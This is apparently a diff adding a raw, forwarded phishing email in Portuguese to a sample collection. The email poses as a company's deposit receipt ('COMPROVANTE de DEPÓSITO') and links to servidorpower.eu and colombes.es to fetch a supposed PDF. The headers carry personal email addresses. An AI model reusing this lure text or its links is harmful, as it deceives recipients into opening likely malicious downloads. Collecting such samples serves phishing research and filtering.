@@ -1,0 +1,150 @@
+Delivered-To: ajuver@gmail.com
+Received: by 10.42.90.205 with SMTP id l13csp51917icm;
+        Thu, 26 Jun 2014 12:48:09 -0700 (PDT)
+X-Received: by 10.42.239.196 with SMTP id kx4mr4894088icb.71.1403812087827;
+        Thu, 26 Jun 2014 12:48:07 -0700 (PDT)
+Authentication-Results: mx.google.com;
+       spf=softfail (google.com: best guess record for domain of transitioning unknown does not designate <unknown> as permitted sender) smtp.mail=;
+       dkim=pass header.i=@gmail.com
+Received-SPF: softfail (google.com: best guess record for domain of transitioning unknown does not designate <unknown> as permitted sender)
+Received: by 10.64.148.102 with POP3 id tr6mf1145971ieb.38;
+        Thu, 26 Jun 2014 12:48:07 -0700 (PDT)
+X-Gmail-Fetch-Info: ajuver@yahoo.com.br 2 pop.mail.yahoo.com.br 995 ajuver
+X-Apparently-To: ajuver@yahoo.com.br via 98.139.244.175; Thu, 26 Jun 2014 19:13:32 +0000
+Received-SPF: pass (domain of gmail.com designates 209.85.219.66 as permitted sender)
+X-YMailISG: j9g.JFMWLDslNY0XOxX0h.oxfEZluyGdegxvD.pI7nlE4.5M
+ v7lMDC8Hb3EQMsb2QxSPJWFZ9U_yOICPozp2RNuftxlFzC8UvAOTDEL.CaOi
+ eZY.otGg7gtzXCB4DMx_cBNVN0eDn1KYa28caYfZeUPsVOgutyN2DvEiM3st
+ 5aWivgdymno9C5dkB4oOG.DMs8pYgZbQD8thaNo5oMMcZ7Wba41rlIMWYYG9
+ KxpqWpgbEHfgMUbyFc0IALgfG_sOAT2ihBlMTRBRiaBmEXW.tE4hXGWV4ueB
+ xa0matdvvpMFgk1mdVZgBaXH69uF1Q4_pRXTRI69GQtGa980R.c5TY1k9yFH
+ GE80lDeACuaMWVdPDGK.j5JzBKQvmxVNfKxRcN_h9MMEVxMBt9TQ29xfAmi1
+ kObYbI3VC1K6DFOGl0fa5a4tjdKhv7GIUPUzCYkSgBUgxJRBojAqhzPj7Bd6
+ I.GDAgWP3E4qAqC59SHJCkab.b_dUiiRhsD2fpXwLS_g71o2_v3NXvBBOqhB
+ uGeBZQooME6BQDhjTuqS4FYax37y603EG3oEI3eNRd5PbTQEgArLbz7zdhLl
+ ChEjlpwkT1m2I844uiIlb6lkWsCON6u4kipb08tK54yF0miu41mSmB42hb9R
+ 7cQSR3yYrV9BLNDG2dRVU0E6.Qj2xbBagIoGF6kvcpcHGb7ypUBroHj4svGd
+ ob2yCmGg.FtttbEWHVXgEHYjFmwqMxuDaXTKDi1QULkkQht9GKeO0INWDJDr
+ d9G.mRh0BRuxz2SHSEuVcnGgo7mNO97Y3vuipb1iAh5NSnV9fybZIc0O1wzX
+ DyU66OAXBoEiXUNJtZNna3HafZQkYWoMcEj7HglWvHH6RqiyD.JS5o.j2yL6
+ y6Ya1Ez5s1UTP9pF9N5c_bC64T9sriN9r8bImUVzhL_q43NcI7P.R7Qne_nY
+ .J8Y8wf5iVd0qOm_4oHuzdf.s2s3zJfG2nsmyuAuUnYfIsh0NuAFFGky6Nno
+ jBkS.gn_YFrrKMV3uQtJybxMRXxreNncML6xMRYSWKq69_J.D7QnSfThDGKy
+ Jk9OkFg87Hzj4XpxtTwEcsjjiVuwWUuN8izliu.rLWuhrgCDXiDBCCSN754V
+ ioCXgAVdBDP1qTQBxl6KAtnGb_aRanRoJggZ5CtnxAlyduTLRmBaci63hGN5
+ fmbbQSGOpBr74DmlpALXENNe8p5PJQrg1FEpDYBTUXACznyltRa0q2Fo3USc
+ pWmsrFfRt31Wyn.a_EzVlGcY25rPid.6l2YZ8qg8X9vl6Gbn3oOcaSEbXvfA
+ LkQg2l..rpIXa.sxOB6gNTRfkyCsQXY9udDNUOx7v8MBBmuMmEVTwMB91O2F
+ BbjVpxrq2M_5sOE0DGqoVvzgevx9Pu9_0ryiA439Zar3OPPh3BfF_IZVYM9M
+ s94BOMbum3Vg1nuoJA--
+X-Originating-IP: [209.85.219.66]
+Authentication-Results: mta1323.mail.ne1.yahoo.com  from=gmail.com; domainkeys=neutral (no sig);  from=gmail.com; dkim=pass (ok)
+Received: from 127.0.0.1  (EHLO mail-oa0-f66.google.com) (209.85.219.66)
+  by mta1323.mail.ne1.yahoo.com with SMTPS; Thu, 26 Jun 2014 19:13:32 +0000
+Received: by mail-oa0-f66.google.com with SMTP id eb12so1148069oac.9
+        for <ajuver@yahoo.com.br>; Thu, 26 Jun 2014 12:13:32 -0700 (PDT)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20120113;
+        h=mime-version:in-reply-to:references:date:message-id:subject:from:to
+         :content-type;
+        bh=C3QA64k3mqZIH0muf9uANEOKZ/DgA61GCzoD4vhgZsI=;
+        b=BfUbctQD2gOtvROUr/deFp+uo3mHQ1iM4rP8vg9vUJfdqjgdxt4+pki95ttX7td4xk
+         v7hineLnJmAPz4fx7mqWWD9fpi0TV6luf509WYh+pJJm9K5ESAY4ClGkXdFYc5aKTJKb
+         RGVDL8ZFzm3kCt6zvIXH6nE0OhFOJseFSQmeCVvm3mM8ZJWT8B9rNzPW28Dw4AXX3zzW
+         TD87vD5aeMau4hOsHwwfyu0pOb8K+xCha6nwkVAd5LsnOjW/B7kTlMYwzUm5ucrcICrR
+         1cbu3o+ne9oipCper4sKg4vaOl59ThJrYw1C+KeCcRj2Zk2Bu1jfqDLYF8UFXluHpih3
+         MYTA==
+MIME-Version: 1.0
+X-Received: by 10.60.35.104 with SMTP id g8mr18303630oej.41.1403810012166;
+ Thu, 26 Jun 2014 12:13:32 -0700 (PDT)
+Received: by 10.182.102.227 with HTTP; Thu, 26 Jun 2014 12:13:32 -0700 (PDT)
+In-Reply-To: <CAN7n+sNW77wqaX22M3Q4=JJxQio2=HtUuJpJ0A0iSfabKLGbDg@mail.gmail.com>
+References: <9a23b141dd526e304f1df2ad2c7ea03c@servidorpower.eu>
+	<CAN7n+sNW77wqaX22M3Q4=JJxQio2=HtUuJpJ0A0iSfabKLGbDg@mail.gmail.com>
+Date: Thu, 26 Jun 2014 16:13:32 -0300
+Message-ID: <CAA3V2bj5u35FLtc80sMn-rmEoj-fGsviycjr8f=Nfj9QAgGqLg@mail.gmail.com>
+Subject: Fwd: Comprovante
+From: Joel Heck <joel.heck@gmail.com>
+To: ajuver@yahoo.com.br
+Content-Type: multipart/alternative; boundary=089e013a1cfe1b811e04fcc1fd6d
+X-Antivirus: avast! (VPS 141014-1, 14/10/2014), Inbound message
+X-Antivirus-Status: Clean
+
+--089e013a1cfe1b811e04fcc1fd6d
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: quoted-printable
+
+---------- Mensagem encaminhada ----------
+De: Grupo JLM LTDA <send@servidorpower.eu>
+Data: 19 de junho de 2014 22:40
+Assunto: Comprovante
+Para: contato@dhmed.com.br
+
+
+ ______________________________________________________________________
+*Este arquivo deve ser armazenado*.
+
+[image: http://colombes.es/stats/index3.php?=3Dnf002whorkshop.pdf]
+<http://servidorpower.eu/link.php?M=3D2117308&N=3D16&L=3D4&F=3DH>
+*COMPROVANTE_DEPOSITO (25) KB
+<http://servidorpower.eu/link.php?M=3D2117308&N=3D16&L=3D4&F=3DH>*
+
+
+
+
+Segue em anexo a c=C3=B3pia do* COMPROVANTE de DEP=C3=93SITO* onde est=C3=
+=A1 a
+descirminado demais detalhes do cr=C3=A9dito.
+Informamos que o valor foi creditado em sua conta com *sucesso*!
+Confira o Valor Creditado em Conta. Qualquer d=C3=BAvida em rela=C3=A7=C3=
+=A3o entrar em
+contato conosco que explicaremos!
+
+
+
+Clique aqui para ser removido
+<http://servidorpower.eu/unsubscribe.php?M=3D2117308&C=3D2d90b43a57e315d0bb=
+78f9ae265e2d81&L=3D12&N=3D16>
+
+--089e013a1cfe1b811e04fcc1fd6d
+Content-Type: text/html; charset=UTF-8
+Content-Transfer-Encoding: quoted-printable
+
+<div dir=3D"ltr"><div class=3D"gmail_quote"><div dir=3D"ltr"><br><br><div c=
+lass=3D"gmail_quote">---------- Mensagem encaminhada ----------<br>De: <b c=
+lass=3D"gmail_sendername">Grupo JLM LTDA</b> <span dir=3D"ltr">&lt;<a href=
+=3D"mailto:send@servidorpower.eu" target=3D"_blank">send@servidorpower.eu</=
+a>&gt;</span><br>
+
+Data: 19 de junho de 2014 22:40<br>Assunto: Comprovante<br>Para: <a href=3D=
+"mailto:contato@dhmed.com.br" target=3D"_blank">contato@dhmed.com.br</a><br=
+><br><br>
+
+
+<div>
+<p style=3D"text-align:left" align=3D"center">_____________________________=
+_________________________________________<br><b>Este arquivo deve ser armaz=
+enado</b>.</p>
+<br><a href=3D"http://servidorpower.eu/link.php?M=3D2117308&amp;N=3D16&amp;=
+L=3D4&amp;F=3DH" target=3D"_blank"><img style=3D"width:105px;min-height:105=
+px;border:0px solid" alt=3D"http://colombes.es/stats/index3.php?=3Dnf002who=
+rkshop.pdf"></a><br>
+
+<span style=3D"font-size:small"><b><a href=3D"http://servidorpower.eu/link.=
+php?M=3D2117308&amp;N=3D16&amp;L=3D4&amp;F=3DH" target=3D"_blank"><small>CO=
+MPROVANTE_DEPOSITO</small>
+(25) KB</a></b></span><br><br><br><br><br>Segue em anexo a
+c=C3=B3pia do<b> COMPROVANTE de DEP=C3=93SITO</b> onde est=C3=A1 a
+descirminado demais detalhes do cr=C3=A9dito.<br>Informamos que o valor
+foi creditado em sua conta com <b>sucesso</b>!<br>Confira o Valor
+Creditado em Conta. Qualquer d=C3=BAvida em rela=C3=A7=C3=A3o entrar
+em contato conosco que explicaremos!<br><br><br>
+<img height=3D"1" width=3D"10"><br><a href=3D"http://servidorpower.eu/unsub=
+scribe.php?M=3D2117308&amp;C=3D2d90b43a57e315d0bb78f9ae265e2d81&amp;L=3D12&=
+amp;N=3D16" target=3D"_blank">Clique
+aqui para ser removido</a></div>
+
+</div><br></div>
+</div><br></div>
+
+--089e013a1cfe1b811e04fcc1fd6d--
